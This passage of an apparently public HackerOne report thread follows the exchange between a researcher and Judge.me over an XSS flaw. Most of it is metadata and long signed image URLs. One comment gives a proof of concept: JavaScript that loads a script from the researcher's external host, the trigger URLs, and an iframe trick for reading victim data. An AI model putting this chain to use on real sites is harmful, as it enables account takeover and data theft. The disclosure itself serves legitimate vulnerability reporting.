Qw3i%2BjEj3n27mXAVXGx17uJj4AZzaAdAN%2Fb7nblHihfCONYhSlmArkzxiwacZx5n%2BkCMiJbI49SZjueO3VcmcjD7qJl9BwZ1W4QT01LH5E0r%2FauBeDReLPQR2A89V610Uem1zJCLjoNtjcpr%2Fy6PNyHeeAwa067JLmyxsCZL2gdW81O9EGHtcrxXf7TlH8A3h0yPO%2B8zVoyJSSsEzzjpzkscidQ86LAyX6CNqqcdHnUJsXeboKB5dqjOphDJLDRfmLzgZTuPihjRKzkML0G3QjO1fWCgDatC%2FHiCuz%2F4Hm5bamHTrdiVE9y%2B%2Bv6QZ2edEQAzLX1lowLp2RzYtTYHwDzZkAjKZJKVeO9zj1pkoJhjfz2VARzHSySfXw0YMwPUVlRPg7L6f%2BQAjpso7C6uYEeozwfIwrkmBFVTZW%2BLEzdRLHNNz7rHyr9w1WlRj4OjJLn5Ee5sdJ5cEyQgF8ir1s09BXAP%2FsqR7THqh25ijYpQsYTzGdJxWFw9Mcq455M0MG7I8oz1i3cTjV9eJJer5Vnjtubr681ZNh6Cbl85VC5gKL3xiZ%2BRa64M54QAtb9tRvCFdlmV7U2Yel7eiB1thRiUc%2BQBXeECkUKbOXNfSGQ6%2FRqu7AD4Qz0GIKmc6obQ3vJeTlVjbt80VYdsyGeWYLjRSjnDrYNEFDoOJTBMPSHuagGOrABfJMTnU4%2FETzLB2BZXf541hyjNiWZ3tqKyh4p%2BOtMGjGYCmsTcu5RXXYGZ3G0puxZ27J20XRP2zhvuPBXAixyr8lz8adwCOfLJe0oCYgqgYmQxwbXeE5pLP9eHwIk2aiqxaN2tTNVGnFifZgT%2BzaAvEW1M5e4bcPdHOcraaqJVAJKjLuYHBPVtsgKcNUbL9bdOH2zFoQgd6ok2JFMDfaY%2FOJ38QDDXR4GXVTD01IxQcc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=998f8cdb3401cce739615c79d9b6c29828f6394dbc61ba9b3b3c48aa38a661d3"
+        }
+      ],
+      "genius_execution_id": null,
+      "team_handle": "judgeme"
+    },
+    {
+      "id": 14527057,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportRetestApproved",
+      "message": null,
+      "automated_response": false,
+      "created_at": "2021-12-03T05:24:22.341Z",
+      "updated_at": "2021-12-03T05:24:22.341Z",
+      "actor": {
+        "url": "/judgeme",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/g9q03amoi8tu4efai3eu2n8z2i3y/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "Judge.me "
+        }
+      },
+      "genius_execution_id": null,
+      "team_handle": "judgeme"
+    },
+    {
+      "id": 14527058,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugResolved",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2021-12-03T05:24:22.465Z",
+      "updated_at": "2021-12-03T05:24:22.465Z",
+      "actor": {
+        "username": "linhdam",
+        "cleared": false,
+        "verified": false,
+        "url": "/linhdam",
+        "profile_picture_urls": {
+          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/613qwlr9euarpq3az6paegjoly1x/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%22mind-blown.jpg%22%3B%20filename%2A%3DUTF-8%27%27mind-blown.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU5JYKTGM%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070251Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQDPextUgVMaFUn7J3YE8kNYUZyiY2543ePlEF9CwFfM8QIhAIRilag%2FrZ1iszKpt2JLQyz8teMsWBamJF4Iou7wqMU3KrIFCCMQAxoMMDEzNjE5Mjc0ODQ5Igwu56k94pqVtX8r%2Bo4qjwXEh1PM7wf2Np3Qm66HGnlSD0VTqg7R%2FtI4UnXMImbHLHRC5z94z14%2FX2eWyQeiZAAq3PHSCaPLB7tsZX%2ByCkLvYSKIVEDIBAiJLNfPf0mrHAbRDGyc8keEypRUwMaT5cop25r%2FpVpMdM%2BVhJVrWWa5ovVSzsmubSxixbH%2BvSDMHrKZm1mklKunLYykTJQX%2BiX5bQw3i%2BjEj3n27mXAVXGx17uJj4AZzaAdAN%2Fb7nblHihfCONYhSlmArkzxiwacZx5n%2BkCMiJbI49SZjueO3VcmcjD7qJl9BwZ1W4QT01LH5E0r%2FauBeDReLPQR2A89V610Uem1zJCLjoNtjcpr%2Fy6PNyHeeAwa067JLmyxsCZL2gdW81O9EGHtcrxXf7TlH8A3h0yPO%2B8zVoyJSSsEzzjpzkscidQ86LAyX6CNqqcdHnUJsXeboKB5dqjOphDJLDRfmLzgZTuPihjRKzkML0G3QjO1fWCgDatC%2FHiCuz%2F4Hm5bamHTrdiVE9y%2B%2Bv6QZ2edEQAzLX1lowLp2RzYtTYHwDzZkAjKZJKVeO9zj1pkoJhjfz2VARzHSySfXw0YMwPUVlRPg7L6f%2BQAjpso7C6uYEeozwfIwrkmBFVTZW%2BLEzdRLHNNz7rHyr9w1WlRj4OjJLn5Ee5sdJ5cEyQgF8ir1s09BXAP%2FsqR7THqh25ijYpQsYTzGdJxWFw9Mcq455M0MG7I8oz1i3cTjV9eJJer5Vnjtubr681ZNh6Cbl85VC5gKL3xiZ%2BRa64M54QAtb9tRvCFdlmV7U2Yel7eiB1thRiUc%2BQBXeECkUKbOXNfSGQ6%2FRqu7AD4Qz0GIKmc6obQ3vJeTlVjbt80VYdsyGeWYLjRSjnDrYNEFDoOJTBMPSHuagGOrABfJMTnU4%2FETzLB2BZXf541hyjNiWZ3tqKyh4p%2BOtMGjGYCmsTcu5RXXYGZ3G0puxZ27J20XRP2zhvuPBXAixyr8lz8adwCOfLJe0oCYgqgYmQxwbXeE5pLP9eHwIk2aiqxaN2tTNVGnFifZgT%2BzaAvEW1M5e4bcPdHOcraaqJVAJKjLuYHBPVtsgKcNUbL9bdOH2zFoQgd6ok2JFMDfaY%2FOJ38QDDXR4GXVTD01IxQcc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=029051a252e1d7e1c567eacf49c5fd68a50484a6d6bf5e5e69e953e006687d65"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "reporter": {
+        "username": "caue",
+        "url": "/caue"
+      },
+      "genius_execution_id": null,
+      "team_handle": "judgeme"
+    },
+    {
+      "id": 14527172,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @caue \n\nThanks for the detailed POC videos!\n\nAbout the 2nd POC `Impact in normal users`, we agree as this is the actual impact that would happen from this XSS issue.\n\nAbout the 1st POC `Shop takeover`:\n- In your 2nd simulation, you switch your Console to the iframe of the victim and then run the simulated XSS. But because you switch to the victim's iframe, it means the XSS has to be injected already in the victim account. And for the XSS to be injected in the victim account, the attacker has to be an admin of the victim account, right?\n- Could you please paste the text in your note here? So that we can rerun this ourselves (and also to get your hosted JS file too).",
+      "automated_response": false,
+      "created_at": "2021-12-03T05:46:19.827Z",
+      "updated_at": "2021-12-03T05:46:19.827Z",
+      "actor": {
+        "username": "linhdam",
+        "cleared": false,
+        "verified": false,
+        "url": "/linhdam",
+        "profile_picture_urls": {
+          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/613qwlr9euarpq3az6paegjoly1x/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%22mind-blown.jpg%22%3B%20filename%2A%3DUTF-8%27%27mind-blown.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU5JYKTGM%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070251Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQDPextUgVMaFUn7J3YE8kNYUZyiY2543ePlEF9CwFfM8QIhAIRilag%2FrZ1iszKpt2JLQyz8teMsWBamJF4Iou7wqMU3KrIFCCMQAxoMMDEzNjE5Mjc0ODQ5Igwu56k94pqVtX8r%2Bo4qjwXEh1PM7wf2Np3Qm66HGnlSD0VTqg7R%2FtI4UnXMImbHLHRC5z94z14%2FX2eWyQeiZAAq3PHSCaPLB7tsZX%2ByCkLvYSKIVEDIBAiJLNfPf0mrHAbRDGyc8keEypRUwMaT5cop25r%2FpVpMdM%2BVhJVrWWa5ovVSzsmubSxixbH%2BvSDMHrKZm1mklKunLYykTJQX%2BiX5bQw3i%2BjEj3n27mXAVXGx17uJj4AZzaAdAN%2Fb7nblHihfCONYhSlmArkzxiwacZx5n%2BkCMiJbI49SZjueO3VcmcjD7qJl9BwZ1W4QT01LH5E0r%2FauBeDReLPQR2A89V610Uem1zJCLjoNtjcpr%2Fy6PNyHeeAwa067JLmyxsCZL2gdW81O9EGHtcrxXf7TlH8A3h0yPO%2B8zVoyJSSsEzzjpzkscidQ86LAyX6CNqqcdHnUJsXeboKB5dqjOphDJLDRfmLzgZTuPihjRKzkML0G3QjO1fWCgDatC%2FHiCuz%2F4Hm5bamHTrdiVE9y%2B%2Bv6QZ2edEQAzLX1lowLp2RzYtTYHwDzZkAjKZJKVeO9zj1pkoJhjfz2VARzHSySfXw0YMwPUVlRPg7L6f%2BQAjpso7C6uYEeozwfIwrkmBFVTZW%2BLEzdRLHNNz7rHyr9w1WlRj4OjJLn5Ee5sdJ5cEyQgF8ir1s09BXAP%2FsqR7THqh25ijYpQsYTzGdJxWFw9Mcq455M0MG7I8oz1i3cTjV9eJJer5Vnjtubr681ZNh6Cbl85VC5gKL3xiZ%2BRa64M54QAtb9tRvCFdlmV7U2Yel7eiB1thRiUc%2BQBXeECkUKbOXNfSGQ6%2FRqu7AD4Qz0GIKmc6obQ3vJeTlVjbt80VYdsyGeWYLjRSjnDrYNEFDoOJTBMPSHuagGOrABfJMTnU4%2FETzLB2BZXf541hyjNiWZ3tqKyh4p%2BOtMGjGYCmsTcu5RXXYGZ3G0puxZ27J20XRP2zhvuPBXAixyr8lz8adwCOfLJe0oCYgqgYmQxwbXeE5pLP9eHwIk2aiqxaN2tTNVGnFifZgT%2BzaAvEW1M5e4bcPdHOcraaqJVAJKjLuYHBPVtsgKcNUbL9bdOH2zFoQgd6ok2JFMDfaY%2FOJ38QDDXR4GXVTD01IxQcc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=029051a252e1d7e1c567eacf49c5fd68a50484a6d6bf5e5e69e953e006687d65"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "judgeme"
+    },
+    {
+      "id": 14527215,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "When I trigger the first XSS, it creates 2 iframes:\n1 - /settings (clickjacking)\n2 - XSS in my account\n\nWhen it creates the first iframe, the victim's cookie is sent, so the page is rendered with victim's information.\nWhen the second iframe is loaded, the victim logs in my account, but the first iframe content still the same.\nI can use the XSS in this second iframe to get the content of this first iframe (which contains victim's information) since they are both in `judge.me` domain. I can get the entire HTML of the first iframe executing this on second iframe: `parent.frames[0].body.innerHTML`.\n\nHere's my note (I sent the js files above):\n```XSS simulation:\nlet x = document.createElement('script')\nx.src = \"//caueo.me/fb3af68664e3a23c0a5e516b94e515cf76f58243af317e447699ab0922617e4f.js\"\ndocument.body.appendChild(x)\n\nTrigger XSS:\nhttps://www.judge.me/shop/emails/2243518/edit?no_iframe=1&shop_domain=wordpress.caueo.me&platform=woocommerce&hmac=██████████\n\nVictim Account:\nhttps://judge.me/index?no_iframe=1&shop_domain=7dbc-2804-14d-ac85-8273-00-1000.ngrok.io&platform=woocommerce&hmac=██████████```",
+      "automated_response": false,
+      "created_at": "2021-12-03T06:00:34.617Z",
+      "updated_at": "2022-05-25T07:51:08.164Z",
+      "actor": {
+        "username": "caue",
+        "cleared": false,
+        "verified": false,
+        "url": "/caue",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/9p2kas9r0xrwhvs4tacmp324q5b1/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "judgeme"
+    },
+    {
+      "id": 14629744,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Any updates?",
+      "automated_response": false,
+      "created_at": "2021-12-10T18:29:59.328Z",
+      "updated_at": "2021-12-10T18:29:59.328Z",
+      "actor": {
+        "username": "caue",
+        "cleared": false,
+        "verified": false,
+        "url": "/caue",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/9p2kas9r0xrwhvs4tacmp324q5b1/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "judgeme"
+    },
+    {
+      "id": 14787671,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "Let's disclose it then?",
+      "automated_response": false,
+      "created_at": "2021-12-23T05:35:55.802Z",
+      "updated_at": "2021-12-23T05:35:55.802Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "caue",
+        "cleared": false,
+        "verified": false,
+        "url": "/caue",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/9p2kas9r0xrwhvs4tacmp324q5b1/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "judgeme"
+    },
+    {
+      "id": 16844292,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2022-05-25T07:45:26.476Z",
+      "updated_at": "2022-05-25T07:45:26.476Z",
+      "actor": {
+        "username": "linhdam",
+        "cleared": false,
+        "verified": false,
+        "url": "/linhdam",
+        "profile_picture_urls": {
+          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/613qwlr9euarpq3az6paegjoly1x/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%22mind-blown.jpg%22%3B%20filename%2A%3DUTF-8%27%27mind-blown.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU5JYKTGM%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070251Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQDPextUgVMaFUn7J3YE8kNYUZyiY2543ePlEF9CwFfM8QIhAIRilag%2FrZ1iszKpt2JLQyz8teMsWBamJF4Iou7wqMU3KrIFCCMQAxoMMDEzNjE5Mjc0ODQ5Igwu56k94pqVtX8r%2Bo4qjwXEh1PM7wf2Np3Qm66HGnlSD0VTqg7R%2FtI4UnXMImbHLHRC5z94z14%2FX2eWyQeiZAAq3PHSCaPLB7tsZX%2ByCkLvYSKIVEDIBAiJLNfPf0mrHAbRDGyc8keEypRUwMaT5cop25r%2FpVpMdM%2BVhJVrWWa5ovVSzsmubSxixbH%2BvSDMHrKZm1mklKunLYykTJQX%2BiX5bQw3i%2BjEj3n27mXAVXGx17uJj4AZzaAdAN%2Fb7nblHihfCONYhSlmArkzxiwacZx5n%2BkCMiJbI49SZjueO3VcmcjD7qJl9BwZ1W4QT01LH5E0r%2FauBeDReLPQR2A89V610Uem1zJCLjoNtjcpr%2Fy6PNyHeeAwa067JLmyxsCZL2gdW81O9EGHtcrxXf7TlH8A3h0yPO%2B8zVoyJSSsEzzjpzkscidQ86LAyX6CNqqcdHnUJsXeboKB5dqjOphDJLDRfmLzgZTuPihjRKzkML0G3QjO1fWCgDatC%2FHiCuz%2F4Hm5bamHTrdiVE9y%2B%2Bv6QZ2edEQAzLX1lowLp2RzYtTYHwDzZkAjKZJKVeO9zj1pkoJhjfz2VARzHSySfXw0YMwPUVlRPg7L6f%2BQAjpso7C6uYEeozwfIwrkmBFVTZW%2BLEzdRLHNNz7rHyr9w1WlRj4OjJLn5Ee5sdJ5cEyQgF8ir1s09BXAP%2FsqR7THqh25ijYpQsYTzGdJxWFw9Mcq455M0MG7I8oz1i3cTjV9eJJer5Vnjtubr681ZNh6Cbl85VC5gKL3xiZ%2BRa64M54QAtb9tRvCFdlmV7U2Yel7eiB1thRiUc%2BQBXeECkUKbOXNfSGQ6%2FRqu7AD4Qz0GIKmc6obQ3vJeTlVjbt80VYdsyGeWYLjRSjnDrYNEFDoOJTBMPSHuagGOrABfJMTnU4%2FETzLB2BZXf541hyjNiWZ3tqKyh4p%2BOtMGjGYCmsTcu5RXXYGZ3G0puxZ27J20XRP2zhvuPBXAixyr8lz8adwCOfLJe0oCYgqgYmQxwbXeE5pLP9eHwIk2aiqxaN2tTNVGnFifZgT%2BzaAvEW1M5e4bcPdHOcraaqJVAJKjLuYHBPVtsgKcNUbL9bdOH2zFoQgd6ok2JFMDfaY%2FOJ38QDDXR4GXVTD01IxQcc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=029051a252e1d7e1c567eacf49c5fd68a50484a6d6bf5e5e69e953e006687d65"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "judgeme"
+    },
+    {
+      "id": 16844293,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportBecamePublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2022-05-25T07:45:26.665Z",
+      "updated_at": "2022-05-25T07:45:26.665Z",
+      "actor": {
+        "username": "linhdam",
+        "cleared": false,
+        "verified": false,
+        "url": "/linhdam",
+        "profile_picture_urls": {
+          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/613qwlr9euarpq3az6paegjoly1x/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%22mind-blown.jpg%22%3B%20filename%2A%3DUTF-8%27%27mind-blown.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU5JYKTGM%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070251Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQDPextUgVMaFUn7J3YE8kNYUZyiY2543ePlEF9CwFfM8QIhAIRilag%2FrZ1iszKpt2JLQyz8teMsWBamJF4Iou7wqMU3KrIFCCMQAxoMMDEzNjE5Mjc0ODQ5Igwu56k94pqVtX8r%2Bo4qjwXEh1PM7wf2Np3Qm66HGnlSD0VTqg7R%2FtI4UnXMImbHLHRC5z94z14%2FX2eWyQeiZAAq3PHSCaPLB7tsZX%2ByCkLvYSKIVEDIBAiJLNfPf0mrHAbRDGyc8keEypRUwMaT5cop25r%2FpVpMdM%2BVhJVrWWa5ovVSzsmubSxixbH%2BvSDMHrKZm1mklKunLYykTJQX%2BiX5bQw3i%2BjEj3n27mXAVXGx17uJj4AZzaAdAN%2Fb7nblHihfCONYhSlmArkzxiwacZx5n%2BkCMiJbI49SZjueO3VcmcjD7qJl9BwZ1W4QT01LH5E0r%2FauBeDReLPQR2A89V610Uem1zJCLjoNtjcpr%2Fy6PNyHeeAwa067JLmyxsCZL2gdW81O9EGHtcrxXf7TlH8A3h0yPO%2B8zVoyJSSsEzzjpzkscidQ86LAyX6CNqqcdHnUJsXeboKB5dqjOphDJLDRfmLzgZTuPihjRKzkML0G3QjO1fWCgDatC%2FHiCuz%2F4Hm5bamHTrdiVE9y%2B%2Bv6QZ2edEQAzLX1lowLp2RzYtTYHwDzZkAjKZJKVeO9zj1pkoJhjfz2VARzHSySfXw0YMwPUVlRPg7L6f%2BQAjpso7C6uYEeozwfIwrkmBFVTZW%2BLEzdRLHNNz7rHyr9w1WlRj4OjJLn5Ee5sdJ5cEyQgF8ir1s09BXAP%2FsqR7THqh25ijYpQsYTzGdJxWFw9Mcq455M0MG7I8oz1i3cTjV9eJJer5Vnjtubr681ZNh6Cbl85VC5gKL3xiZ%2BRa64M54QAtb9tRvCFdlmV7U2Yel7eiB1thRiUc%2BQBXeECkUKbOXNfSGQ6%2FRqu7AD4Qz0GIKmc6obQ3vJeTlVjbt80VYdsyGeWYLjRSjnDrYNEFDoOJTBMPSHuagGOrABfJMTnU4%2FETzLB2BZXf541hyjNiWZ3tqKyh4p%2BOtMGjGYCmsTcu5RXXYGZ3G0puxZ27J20XRP2zhvuPBXAixyr8lz8adwCOfLJe0oCYgqgYmQxwbXeE5pLP9eHwIk2aiqxaN2tTNVGnFifZgT%2BzaAvEW1M5e4bcPdHOcraaqJVAJKjLuYHBPVtsgKcNUbL9bdOH2zFoQgd6ok2JFMDfaY%2FOJ38QDDXR4GXVTD01IxQcc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=029051a252e1d7e1c567eacf49c5fd68a50484a6d6bf5e5e69e953e006687d65"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "judgeme"
+    },
+    {
+      "id": 16844365,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @caue \n\nSorry for the late response! We still haven't had a chance to review your last POC but we believe you are right so we will update the severity and bounty accordingly. Thanks for the report again!",
+      "automated_response": false,
+      "created_at": "2022-05-25T07:53:29.287Z",
+      "updated_at": "2022-05-25T07:53:29.287Z",
+      "actor": {
+        "username": "linhdam",
+        "cleared": false,
+        "verified": false,
+        "url": "/linhdam",
+        "profile_picture_urls": {
+          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/613qwlr9euarpq3az6paegjoly1x/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%22mind-blown.jpg%22%3B%20filename%2A%3DUTF-8%27%27mind-blown.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU5JYKTGM%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070251Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQDPextUgVMaFUn7J3YE8kNYUZyiY2543ePlEF9CwFfM8QIhAIRilag%2FrZ1iszKpt2JLQyz8teMsWBamJF4Iou7wqMU3KrIFCCMQAxoMMDEzNjE5Mjc0ODQ5Igwu56k94pqVtX8r%2Bo4qjwXEh1PM7wf2Np3Qm66HGnlSD0VTqg7R%2FtI4UnXMImbHLHRC5z94z14%2FX2eWyQeiZAAq3PHSCaPLB7tsZX%2ByCkLvYSKIVEDIBAiJLNfPf0mrHAbRDGyc8keEypRUwMaT5cop25r%2FpVpMdM%2BVhJVrWWa5ovVSzsmubSxixbH%2BvSDMHrKZm1mklKunLYykTJQX%2BiX5bQw3i%2BjEj3n27mXAVXGx17uJj4AZzaAdAN%2Fb7nblHihfCONYhSlmArkzxiwacZx5n%2BkCMiJbI49SZjueO3VcmcjD7qJl9BwZ1W4QT01LH5E0r%2FauBeDReLPQR2A89V610Uem1zJCLjoNtjcpr%2Fy6PNyHeeAwa067JLmyxsCZL2gdW81O9EGHtcrxXf7TlH8A3h0yPO%2B8zVoyJSSsEzzjpzkscidQ86LAyX6CNqqcdHnUJsXeboKB5dqjOphDJLDRfmLzgZTuPihjRKzkML0G3QjO1fWCgDatC%2FHiCuz%2F4Hm5bamHTrdiVE9y%2B%2Bv6QZ2edEQAzLX1lowLp2RzYtTYHwDzZkAjKZJKVeO9zj1pkoJhjfz2VARzHSySfXw0YMwPUVlRPg7L6f%2BQAjpso7C6uYEeozwfIwrkmBFVTZW%2BLEzdRLHNNz7rHyr9w1WlRj4OjJLn5Ee5sdJ5cEyQgF8ir1s09BXAP%2FsqR7THqh25ijYpQsYTzGdJxWFw9Mcq455M0MG7I8oz1i3cTjV9eJJer5Vnjtubr681ZNh6Cbl85VC5gKL3xiZ%2BRa64M54QAtb9tRvCFdlmV7U2Yel7eiB1thRiUc%2BQBXeECkUKbOXNfSGQ6%2FRqu7AD4Qz0GIKmc6obQ3vJeTlVjbt80VYdsyGeWYLjRSjnDrYNEFDoOJTBMPSHuagGOrABfJMTnU4%2FETzLB2BZXf541hyjNiWZ3tqKyh4p%2BOtMGjGYCmsTcu5RXXYGZ3G0puxZ27J20XRP2zhvuPBXAixyr8lz8adwCOfLJe0oCYgqgYmQxwbXeE5pLP9eHwIk2aiqxaN2tTNVGnFifZgT%2BzaAvEW1M5e4bcPdHOcraaqJVAJKjLuYHBPVtsgKcNUbL9bdOH2zFoQgd6ok2JFMDfaY%2FOJ38QDDXR4GXVTD01IxQcc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=029051a252e1d7e1c567eacf49c5fd68a50484a6d6bf5e5e69e953e006687d65"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "judgeme"
+    },
+    {
+      "id": 16844379,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportSeverityUpdated",
+      "message": "We still haven't had a chance to review your last POC but we believe you are right so we will update the severity to High and the bounty accordingly.",
+      "automated_response": false,
+      "created_at": "2022-05-25T07:54:07.933Z",
+      "updated_at": "2022-05-25T07:54:07.933Z",
+      "additional_data": {
+        "old_severity": "Medium (4.8)",
+        "new_severity": "High (7.5)",
+        "old_severity_id": 1315605,
+        "new_severity_id": 1514786
+      },
+      "actor": {
+        "username": "linhdam",
+        "cleared": false,
+        "verified": false,
+        "url": "/linhdam",
+        "profile_picture_urls": {
+          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/613qwlr9euarpq3az6paegjoly1x/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%22mind-blown.jpg%22%3B%20filename%2A%3DUTF-8%27%27mind-blown.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU5JYKTGM%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070251Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQDPextUgVMaFUn7J3YE8kNYUZyiY2543ePlEF9CwFfM8QIhAIRilag%2FrZ1iszKpt2JLQyz8teMsWBamJF4Iou7wqMU3KrIFCCMQAxoMMDEzNjE5Mjc0ODQ5Igwu56k94pqVtX8r%2Bo4qjwXEh1PM7wf2Np3Qm66HGnlSD0VTqg7R%2FtI4UnXMImbHLHRC5z94z14%2FX2eWyQeiZAAq3PHSCaPLB7tsZX%2ByCkLvYSKIVEDIBAiJLNfPf0mrHAbRDGyc8keEypRUwMaT5cop25r%2FpVpMdM%2BVhJVrWWa5ovVSzsmubSxixbH%2BvSDMHrKZm1mklKunLYykTJQX%2BiX5bQw3i%2BjEj3n27mXAVXGx17uJj4AZzaAdAN%2Fb7nblHihfCONYhSlmArkzxiwacZx5n%2BkCMiJbI49SZjueO3VcmcjD7qJl9BwZ1W4QT01LH5E0r%2FauBeDReLPQR2A89V610Uem1zJCLjoNtjcpr%2Fy6PNyHeeAwa067JLmyxsCZL2gdW81O9EGHtcrxXf7TlH8A3h0yPO%2B8zVoyJSSsEzzjpzkscidQ86LAyX6CNqqcdHnUJsXeboKB5dqjOphDJLDRfmLzgZTuPihjRKzkML0G3QjO1fWCgDatC%2FHiCuz%2F4Hm5bamHTrdiVE9y%2B%2Bv6QZ2edEQAzLX1lowLp2RzYtTYHwDzZkAjKZJKVeO9zj1pkoJhjfz2VARzHSySfXw0YMwPUVlRPg7L6f%2BQAjpso7C6uYEeozwfIwrkmBFVTZW%2BLEzdRLHNNz7rHyr9w1WlRj4OjJLn5Ee5sdJ5cEyQgF8ir1s09BXAP%2FsqR7THqh25ijYpQsYTzGdJxWFw9Mcq455M0MG7I8oz1i3cTjV9eJJer5Vnjtubr681ZNh6Cbl85VC5gKL3xiZ%2BRa64M54QAtb9tRvCFdlmV7U2Yel7eiB1thRiUc%2BQBXeECkUKbOXNfSGQ6%2FRqu7AD4Qz0GIKmc6obQ3vJeTlVjbt80VYdsyGeWYLjRSjnDrYNEFDoOJTBMPSHuagGOrABfJMTnU4%2FETzLB2BZXf541hyjNiWZ3tqKyh4p%2BOtMGjGYCmsTcu5RXXYGZ3G0puxZ27J20XRP2zhvuPBXAixyr8lz8adwCOfLJe0oCYgqgYmQxwbXeE5pLP9eHwIk2aiqxaN2tTNVGnFifZgT%2BzaAvEW1M5e4bcPdHOcraaqJVAJKjLuYHBPVtsgKcNUbL9bdOH2zFoQgd6ok2JFMDfaY%2FOJ38QDDXR4GXVTD01IxQcc